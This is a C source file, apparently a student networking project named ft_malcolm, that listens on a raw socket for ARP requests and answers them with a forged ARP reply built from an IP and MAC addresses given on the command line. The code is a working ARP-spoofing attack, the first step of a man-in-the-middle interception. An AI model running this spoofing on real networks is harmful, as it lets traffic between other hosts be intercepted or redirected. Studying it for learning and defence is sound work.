/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_malcolm.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cclaude <cclaude@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/01 18:43:59 by cclaude           #+#    #+#             */
/*   Updated: 2021/09/10 19:34:46 by cclaude          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

void print_arp (struct ethhdr *eth, struct ether_arp *arp)
{
	printf(" > eth->h_dest          %02X:%02X:%02X:%02X:%02X:%02X\n", eth->h_dest[0], eth->h_dest[1], eth->h_dest[2], eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
	printf(" > eth->h_source        %02X:%02X:%02X:%02X:%02X:%02X\n", eth->h_source[0], eth->h_source[1], eth->h_source[2], eth->h_source[3], eth->h_source[4], eth->h_source[5]);
	printf(" > eth->h_proto         %04X                 (0806 for ARP)\n", ntohs(eth->h_proto));
	printf(" > arp->ea_hdr.ar_hrd   %-20u (1 for Ethernet)\n", ntohs(arp->ea_hdr.ar_hrd));
	printf(" > arp->ea_hdr.ar_pro   %-20u (2048 for IP)\n", ntohs(arp->ea_hdr.ar_pro));
	printf(" > arp->ea_hdr.ar_hln   %-20u (6 for MAC)\n", arp->ea_hdr.ar_hln);
	printf(" > arp->ea_hdr.ar_pln   %-20u (4 for IPv4)\n", arp->ea_hdr.ar_pln);
	printf(" > arp->ea_hdr.ar_op    %-20u (1 for request, 2 for reply)\n", ntohs(arp->ea_hdr.ar_op));
	printf(" > arp->arp_sha         %02X:%02X:%02X:%02X:%02X:%02X\n", arp->arp_sha[0], arp->arp_sha[1], arp->arp_sha[2], arp->arp_sha[3], arp->arp_sha[4], arp->arp_sha[5]);
	printf(" > arp->arp_spa         %d.%d.%d.%d\n", arp->arp_spa[0], arp->arp_spa[1], arp->arp_spa[2], arp->arp_spa[3]);
	printf(" > arp->arp_tha         %02X:%02X:%02X:%02X:%02X:%02X\n", arp->arp_tha[0], arp->arp_tha[1], arp->arp_tha[2], arp->arp_tha[3], arp->arp_tha[4], arp->arp_tha[5]);
	printf(" > arp->arp_tpa         %d.%d.%d.%d\n", arp->arp_tpa[0], arp->arp_tpa[1], arp->arp_tpa[2], arp->arp_tpa[3]);
	printf("\n");
}

void print_hostent (struct hostent *ent)
{
	printf("Hostent contents\n");
	printf("Name : %s\n", ent->h_name);
	for (int i = 0 ; ent->h_aliases[i] ; i++)
		printf("Alias : %s\n", ent->h_aliases[i]);
	printf("Address type : %d\n", ent->h_addrtype);
	printf("Address length : %d\n", ent->h_length);
	for (int i = 0 ; ent->h_addr_list[i] ; i++)
		printf("Address list : %s\n", ent->h_addr_list[i]);
	printf("\n");
}

void print_addrll (struct sockaddr_ll *addr)
{
	printf(" > addr->sll_family %hu\n", addr->sll_family);
	printf(" > addr->sll_protocol %hu\n", addr->sll_protocol);
	printf(" > addr->sll_ifindex %d\n", addr->sll_ifindex);
	printf(" > addr->sll_hatype %hu\n", addr->sll_hatype);
	printf(" > addr->sll_pkttype %d\n", addr->sll_pkttype);
	printf(" > addr->sll_halen %d\n", addr->sll_halen);
	printf(" > addr->sll_addr %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X\n", addr->sll_addr[0], addr->sll_addr[1], addr->sll_addr[2], addr->sll_addr[3], addr->sll_addr[4], addr->sll_addr[5], addr->sll_addr[6], addr->sll_addr[7]);
	printf("\n");
}

void print_ifaddrs (struct ifaddrs *ifaddr)
{
	printf("Available interfaces :\n");
	for (struct ifaddrs *ifa = ifaddr ; ifa != NULL ; ifa = ifa->ifa_next)
	{
		if (ifa->ifa_addr->sa_family == PF_PACKET)
		{
			printf("- %s (PF_PACKET)\n", ifa->ifa_name);
			print_addrll((struct sockaddr_ll *)ifa->ifa_addr);
		}
		else if (ifa->ifa_addr->sa_family == PF_INET)
			printf("- %s (PF_INET)\n", ifa->ifa_name);
		else if (ifa->ifa_addr->sa_family == PF_INET6)
			printf("- %s (PF_INET6)\n", ifa->ifa_name);
		else
			printf("- %s (Unknown)\n", ifa->ifa_name);
	}
	printf("\n");
}

int hex_value (char c)
{
	if (c >= 'a')
		return (c - 'W');
	return (c - '0');
}

void fill_mac (unsigned char *addr, char *mac)
{
	for (int i = 0, j = 0 ; i < 6 ; i++, j += 3)
		addr[i] = 16 * hex_value(mac[j]) + hex_value(mac[j + 1]);
}

#include <string.h>

// TO DO :
// - REARRANGE STUFF
// - GET MAC FROM IF FOR H_SOURCE
// - CHECK IP FROM ARP REQUEST
// - BIND TO IF TO REMOVE ADDR ARG FROM SENTO ?

int main (int ac, char **av)
{
	if (error_check(ac, av))
		return (1);

	int packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	printf("Connected on socket : %d\n\n", packet_socket);

	// struct hostent *ent = gethostbyname(av[1]);
	// print_hostent(ent);

	// if (setsockopt(packet_socket, SOL_SOCKET, SO_BINDTODEVICE, ifa->ifa_name, strlen(ifa->ifa_name)) == 0)
	// 	printf("Successfully used setsockopt to bind socket to %s\n\n", ifa->ifa_name);
	// else
	// 	printf("setsockopt failed !\n\n");

	while (1)
	{
		char packet[1000] = {0};
		struct sockaddr_ll addr = {0};
		socklen_t addrlen = sizeof(addr);
		int packet_len = recvfrom(packet_socket, packet, 1000, 0, (struct sockaddr *)&addr, &addrlen);

		if (packet_len == ETHER_HDR_LEN + ETHER_ARP_LEN)
		{
			struct ethhdr *eth = (struct ethhdr *)packet;
			struct ether_arp *arp = (struct ether_arp *)(packet + ETHER_HDR_LEN);
			if (ntohs(eth->h_proto) == ETH_P_ARP && ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST)
			{
				printf("Received ARP request !\n\n");

				printf("ARP Request :\n");
				print_arp(eth, arp);

				arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
				*(unsigned int *)arp->arp_spa = inet_addr(av[1]);
				fill_mac(eth->h_source, "60:f2:62:c7:5d:c6");
				fill_mac(arp->arp_sha, av[2]);
				*(unsigned int *)arp->arp_tpa = inet_addr(av[3]);
				fill_mac(eth->h_dest, av[4]);
				fill_mac(arp->arp_tha, av[4]);

				printf("Modified buffer (ARP Reply) :\n");
				print_arp(eth, arp);

				printf("Sockaddr_ll from recvfrom :\n");
				print_addrll(&addr);

				struct ifaddrs *ifaddr;
				getifaddrs(&ifaddr);
				// print_ifaddrs(ifaddr);
				// freeifaddrs(ifaddr);
				struct ifaddrs *ifa = ifaddr;
				while (ifa && ((struct sockaddr_ll *)ifa->ifa_addr)->sll_ifindex != addr.sll_ifindex)
					ifa = ifa->ifa_next;

				printf("Selected interface : %s (should be %d : %d)\n\n", ifa->ifa_name, PF_PACKET, ifa->ifa_addr->sa_family);

				// fill_mac(addr.sll_addr, "aa:bb:cc:dd:ee:ff");
				// memcpy(addr.sll_addr, ((struct sockaddr_ll *)ifa->ifa_addr)->sll_addr, 8);
				// addr.sll_ifindex = ((struct sockaddr_ll *)ifa->ifa_addr)->sll_ifindex;
				// fill_mac(addr.sll_addr, av[4]);
				freeifaddrs(ifaddr);

				printf("Modified sockaddr_ll (for sendto) :\n");
				print_addrll(&addr);

				packet_len = sendto(packet_socket, packet, ETHER_HDR_LEN + ETHER_ARP_LEN, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
				printf("Sent : %d\n\n", packet_len);
				if (packet_len == -1)
					perror("Oops ");

				break ;
			}
		}
	}

	close(packet_socket);

	return (0);
}

// struct sockaddr_ll
//   {
//     unsigned short int sll_family;
//     unsigned short int sll_protocol;
//     int sll_ifindex;
//     unsigned short int sll_hatype;
//     unsigned char sll_pkttype;
//     unsigned char sll_halen;
//     unsigned char sll_addr[8];
//   };


// struct	ether_arp {
// 	struct	arphdr ea_hdr;		/* fixed-size header */
// 		=> struct arphdr
//
//     		unsigned short int ar_hrd;		/* Format of hardware address.  */ => 1, ARPHRD_ETHER (unchanged)
//     		unsigned short int ar_pro;		/* Format of protocol address.  */ => 2048 (unchanged)
//     		unsigned char ar_hln;		/* Length of hardware address.  */ => 6 (unchanged)
//     		unsigned char ar_pln;		/* Length of protocol address.  */ => 4 (unchanged)
//     		unsigned short int ar_op;		/* ARP opcode (command).  */ => 2, ARPOP_REPLY (CHANGED, don't forget htons)
//   };
// 	uint8_t arp_sha[ETH_ALEN];	/* sender hardware address */ => arp_tha ?
// 	uint8_t arp_spa[4];		/* sender protocol address */ => arp_tpa ?
// 	uint8_t arp_tha[ETH_ALEN];	/* target hardware address */
// 	uint8_t arp_tpa[4];		/* target protocol address */
// };
